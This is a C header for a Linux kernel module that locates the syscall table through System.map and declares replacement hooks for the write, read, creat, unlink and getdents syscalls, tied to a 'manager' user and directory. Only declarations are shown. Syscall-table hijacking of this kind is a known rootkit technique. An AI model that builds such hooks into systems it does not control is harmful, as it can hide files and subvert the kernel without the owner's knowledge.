#ifndef SI_NF_HOOKS
#define SI_NF_HOOKS

#include <linux/module.h>  /* Needed by all kernel modules */
#include <linux/kernel.h>  /* Needed for loglevels (KERN_WARNING, KERN_EMERG, KERN_INFO, etc.) */
#include <linux/init.h>    /* Needed for __init and __exit macros. */
#include <linux/unistd.h>  /* sys_call_table __NR_* system call function indices */
#include <linux/fs.h>      /* filp_open */
#include <linux/slab.h>    /* kmalloc */

#include <asm/paravirt.h> /* write_cr0 */
#include <asm/uaccess.h>  /* get_fs, set_fs */
#include <linux/dirent.h> /* linux_dirent64 */

#define PROC_V    "/proc/version"
#define BOOT_PATH "/boot/System.map-"
#define MAX_VERSION_LEN   256
#define MAX_PATH_LEN 256

extern uid_t manager_uid;
extern unsigned long *syscall_table;
extern const char manager_dir[MAX_PATH_LEN];
extern asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
extern asmlinkage int (*original_read)(unsigned int, char __user *, size_t);
extern asmlinkage int (*original_creat)(const char __user *, int);
extern asmlinkage int (*original_unlink)(const char *);
extern asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
extern asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent64 *, unsigned int);

int find_sys_call_table (char *kern_ver);
char *acquire_kernel_version (char *buf);

asmlinkage int new_write (unsigned int x, const char __user *y, size_t size);
asmlinkage int new_read(unsigned int x, char __user *y, size_t size);
asmlinkage int new_creat(const char __user * path, int mode);
asmlinkage int new_unlink(const char __user * path);
asmlinkage int new_getdents64(unsigned int, struct linux_dirent64 *, unsigned int);
asmlinkage int new_getdents(unsigned int, struct linux_dirent64 *, unsigned int);

#endif
